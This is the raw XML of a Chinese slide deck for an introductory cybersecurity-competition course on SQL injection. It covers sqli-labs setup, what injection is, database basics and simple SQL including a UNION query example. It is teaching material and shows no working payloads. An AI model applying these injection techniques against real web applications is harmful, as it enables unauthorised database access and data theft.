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3"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId5"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId4"/>
    <p:sldId id="698" r:id="rId6"/>
    <p:sldId id="709" r:id="rId7"/>
    <p:sldId id="708" r:id="rId8"/>
    <p:sldId id="710" r:id="rId9"/>
    <p:sldId id="711" r:id="rId10"/>
    <p:sldId id="712" r:id="rId11"/>
    <p:sldId id="699" r:id="rId12"/>
    <p:sldId id="714" r:id="rId13"/>
    <p:sldId id="716" r:id="rId14"/>
    <p:sldId id="713" r:id="rId15"/>
    <p:sldId id="704" r:id="rId16"/>
    <p:sldId id="717" r:id="rId17"/>
    <p:sldId id="718" r:id="rId18"/>
    <p:sldId id="719" r:id="rId19"/>
    <p:sldId id="720" r:id="rId20"/>
    <p:sldId id="707" r:id="rId21"/>
    <p:sldId id="701" r:id="rId22"/>
    <p:sldId id="70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1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737" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="817" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="641" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" orient="horz" pos="58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1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1A4157"/>
    <a:srgbClr val="394479"/>
    <a:srgbClr val="D9D9D9"/>
    <a:srgbClr val="BC3649"/>
    <a:srgbClr val="557788"/>
    <a:srgbClr val="8CA3AE"/>
    <a:srgbClr val="416C69"/>
    <a:srgbClr val="006C30"/>
    <a:srgbClr val="ADB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71108" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" showGuides="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="72" d="100"/>
          <a:sy n="72" d="100"/>
        </p:scale>
        <p:origin x="1444" y="64"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="1911"/>
        <p:guide pos="3840"/>
        <p:guide pos="6737"/>
        <p:guide pos="817"/>
        <p:guide orient="horz" pos="641"/>
        <p:guide orient="horz" pos="58"/>
        <p:guide orient="horz" pos="3928"/>
        <p:guide orient="horz" pos="31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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/baidu_35297930/article/details/89096283" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/Stupid__Angel/article/details/12680641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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/baidu_35297930/article/details/89096283" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/Stupid__Angel/article/details/12680641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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/baidu_35297930/article/details/89096283" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/Stupid__Angel/article/details/12680641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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/baidu_35297930/article/details/89096283" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/Stupid__Angel/article/details/12680641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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/baidu_35297930/article/details/89096283" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/Stupid__Angel/article/details/12680641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环境搭建：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Phpstudy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>phpStudy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>下载（安装）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图文详解（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>）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0" dirty="0" err="1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sqli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-labs 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下载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+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安装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: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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载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安装（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>）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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载 半夜好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zh-CN" altLang="en-US" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="222226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环境搭建：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Phpstudy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>phpStudy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>下载（安装）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图文详解（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>）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0" dirty="0" err="1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sqli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-labs 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下载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+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安装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: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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载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安装（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>）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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载 半夜好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zh-CN" altLang="en-US" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="222226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环境搭建：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Phpstudy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>phpStudy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>下载（安装）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图文详解（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>）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0" dirty="0" err="1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sqli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-labs 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下载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+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安装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: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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载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安装（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>）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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载 半夜好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zh-CN" altLang="en-US" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="222226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环境搭建：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Phpstudy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>phpStudy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>下载（安装）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图文详解（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>）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0" dirty="0" err="1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sqli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-labs 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下载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+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安装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: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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载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安装（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>）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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载 半夜好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zh-CN" altLang="en-US" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="222226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环境搭建：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Phpstudy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>phpStudy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>下载（安装）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图文详解（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>）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0" dirty="0" err="1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sqli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-labs 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下载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+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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安装</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="222226"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="PingFang SC"/>
              </a:rPr>
              <a:t>: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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载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安装（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>）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sqli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>-labs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>下载 半夜好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zh-CN" altLang="en-US" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="222226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  <a:noFill/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2C0D-3978-4D00-BE11-3FF38497FC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F69DF-D574-4037-B6A5-58CCD724C6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0" y="2248351"/>
            <a:ext cx="12192000" cy="894080"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr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网络空间安全竞赛体验课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-SQL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注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
              <a:ea typeface="华光中圆_CNKI" panose="02000500000000000000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73098" y="4711552"/>
            <a:ext cx="10845800" cy="1709126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助教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陈慧珍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任课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老师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鲁辉、何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郁郁</a:t>
            </a:r>
            <a:endPara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0156" y="321100"/>
            <a:ext cx="5080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什么是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>注入？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3435" y="1347470"/>
            <a:ext cx="4214495" cy="31286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1030" y="1878330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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入即是指</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>应用程序</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>用户输入的数据</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的合法性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>没有判断或过滤不严</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" u="sng"/>
              <a:t>攻击者可以在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" u="sng"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" u="sng"/>
              <a:t>应用程序中事先定义好的查询语句的结尾上添加额外的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" u="sng"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" u="sng"/>
              <a:t>语包，在管理员不知情的情况下实现非法操作</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，以此来实现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息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9930" y="386334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语句没有做过滤</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>》输入的数据可以传入到后端甚至数据库执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>》成功恶意操作（非法获取数据、植入木马对网站进行恶意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>操作）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0791" y="281730"/>
            <a:ext cx="5080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什么是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>注入？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710565" y="1233170"/>
            <a:ext cx="10153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web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>应用程序三层架构：视图层</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>业务逻辑层</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>数据访问层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645795" y="4528185"/>
            <a:ext cx="101536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select * from user where name=‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>张三</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>’ and pass =12345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查询到结果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>》返回登陆成功</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>的页面</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN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如果没有查询到结果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>》提示用户输入的账号密码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>错误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635" y="1806575"/>
            <a:ext cx="6928485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3181" y="343960"/>
            <a:ext cx="50808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什么是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>数据库？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115060" y="1120140"/>
            <a:ext cx="9025890" cy="870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/>
              <a:t>数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。以下是比较主流的两种</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>数据库。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782955" y="4316095"/>
            <a:ext cx="10447020" cy="3009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关系型数据库：存储的格式可以直观地反映实体间的关系，和常见的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>EXCEL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>表格比较相似</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>常见的关系型数据库有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>MySQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Orcale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>PostgreSQL, SQL Server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>等。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN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非关系型数据库：随着近些年技术方向的不断扩展，比如说大量的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>NoSQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>数据库如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t> Mon goDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Redis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>NoSQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>数据库适合追求速度和可扩展性，业务多变的场景。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875" y="2313940"/>
            <a:ext cx="6972300" cy="1679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1445895"/>
            <a:ext cx="5175885" cy="36537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15833" y="437822"/>
            <a:ext cx="39894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数据库</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>层级关系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687695" y="2329180"/>
            <a:ext cx="61925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数据库服务器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>》多个数据库</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>》多个数据表</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>》多个行、列（字段）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>》数据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6460018" y="3816657"/>
            <a:ext cx="398943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如何查询数据库的数据？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Sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>语言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sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>的一些基础操作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7604" y="1267667"/>
            <a:ext cx="3111660" cy="323866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27969" y="1642369"/>
            <a:ext cx="7670307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show databases; //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>查看库</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>库名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>;	//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用某个库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show tables;       //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>查看</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>所有表</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>database() schema()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>表名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>;  //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>查询表的数据</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="-apple-system"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>条件查询</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/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表名 where id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>=1;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合并查询union</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（前面查询的语句与后面的语句结果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>互不干扰）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 表名 where xx=xx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> union </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>select * from 表名 where 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=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;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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 j9nzvzn56w where id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>=1 union select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>* from 表名 where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>tryy=0;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 j9nzvzn56w where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id=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dirty="0">
                <a:sym typeface="+mn-ea"/>
